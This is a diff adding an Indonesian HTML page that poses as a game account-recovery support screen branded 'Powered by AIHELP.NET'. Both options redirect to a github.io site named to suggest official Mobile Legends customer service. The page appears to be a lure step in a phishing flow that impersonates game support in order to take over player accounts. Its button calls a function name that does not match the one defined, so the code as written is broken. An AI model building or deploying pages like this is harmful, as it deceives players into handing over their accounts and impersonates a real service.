@@ -1,0 +1,99 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pilih Metode Pemulihan Akun</title>
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: sans-serif; }
+        body { background: #F7F9FA; height: 100vh; display: flex; flex-direction: column; justify-content: space-between; user-select: none; overflow: hidden; }
+        
+        /* Header */
+        .header { background: #3B66A4; color: white; text-align: center; padding: 15px; font-size: 16px; font-weight: 400; position: relative; z-index: 10; }
+        
+        /* Content Form */
+        .content { flex: 1; padding: 24px 16px; z-index: 10; }
+        
+        /* Label Judul Utama */
+        .section-title { font-size: 14px; color: #555; margin-bottom: 16px; font-weight: 500; display: flex; align-items: center; }
+        .asterisk { color: #D9383A; font-weight: bold; margin-right: 6px; font-size: 16px; }
+        
+        /* Container Opsi Kontainer */
+        .options-group { display: flex; flex-direction: column; gap: 12px; }
+        
+        /* Custom Radio Card */
+        .option-card { background: white; border: 1px solid #EAEAEA; border-radius: 8px; padding: 18px 16px; display: flex; align-items: center; justify-content: space-between; cursor: pointer; transition: background-color 0.2s; }
+        .option-card:active { background: #F9FAFB; }
+        
+        .option-text { font-size: 15px; color: #333; }
+        
+        /* Desain Struktur Bullet Lingkaran Custom */
+        .radio-circle { width: 22px; height: 22px; border: 1px solid #CCC; border-radius: 50%; display: flex; align-items: center; justify-content: center; transition: all 0.2s; }
+        
+        /* Style ketika Radio Aktif Terpilih */
+        input[type="radio"] { display: none; }
+        input[type="radio"]:checked + .option-card { border-color: #EAEAEA; }
+        input[type="radio"]:checked + .option-card .radio-circle { background: #1A8CFF; border-color: #1A8CFF; }
+        
+        /* Simbol Centang Putih di Dalam Lingkaran Aktif */
+        input[type="radio"]:checked + .option-card .radio-circle::after { content: ''; width: 6px; height: 10px; border: solid white; border-width: 0 2px 2px 0; transform: rotate(45deg); margin-bottom: 2px; }
+        
+        /* Footer Buttons */
+        .footer { padding: 16px; z-index: 10; }
+        .btn-blue { display: block; width: 100%; border: none; padding: 14px; border-radius: 10px; font-size: 16px; font-weight: 500; cursor: pointer; text-align: center; background: #1A8CFF; color: white; }
+        .btn-blue:active { background: #0073E6; }
+        .wm { text-align: center; font-size: 10px; color: #AAA; margin-top: 15px; }
+    </style>
+</head>
+<body>
+
+    <div class="header">
+        Pilih Metode Pemulihan Akun
+    </div>
+
+    <div class="content">
+        <div class="section-title">
+            <span class="asterisk">*</span> Pilih Metode Pemulihan Akun
+        </div>
+        
+        <div class="options-group">
+            <label>
+                <input type="radio" name="metodePemulihan" value="id_akun" checked>
+                <div class="option-card">
+                    <span class="option-text">Melalui ID Akun</span>
+                    <div class="radio-circle"></div>
+                </div>
+            </label>
+
+            <label>
+                <input type="radio" name="metodePemulihan" value="nama_akun">
+                <div class="option-card">
+                    <span class="option-text">Melalui Nama</span>
+                    <div class="radio-circle"></div>
+                </div>
+            </label>
+        </div>
+    </div>
+
+    <div class="footer">
+        <button class="btn-blue" onclick="arahkanLink()">Berikutnya</button>
+        <div class="wm">Powered by AIHELP.NET</div>
+    </div>
+
+    <script>
+        function arahanLink() {
+            // Mengambil nilai dari radio button yang sedang dicentang/dipilih
+            var pilihan = document.querySelector('input[name="metodePemulihan"]:checked').value;
+
+            if (pilihan === "id_akun") {
+                // Pengalihan untuk pilihan "Melalui ID Akun"
+                window.location.replace("https://csmobilelegendsgame.github.io/recovery-2/");
+            } else if (pilihan === "nama_akun") {
+                // Pengalihan untuk pilihan "Melalui Nama" (bisa kamu ganti teks link-nya nanti di sini)
+                window.location.replace("https://csmobilelegendsgame.github.io/recovery-2/");
+            }
+        }
+    </script>
+
+</body>
+</html>
